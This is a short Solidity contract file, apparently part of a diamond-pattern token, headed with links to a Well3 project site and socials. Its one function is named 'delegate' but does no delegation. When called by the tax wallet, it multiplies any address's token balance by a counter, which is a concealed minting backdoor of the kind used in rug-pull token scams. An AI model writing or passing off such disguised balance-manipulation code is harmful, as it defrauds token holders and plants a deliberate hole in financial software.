// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://well3.com/
    Twitter:  https://twitter.com/well3official
    Discord:  https://discord.com/invite/yogapetz

*/

pragma solidity ^0.8.23;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
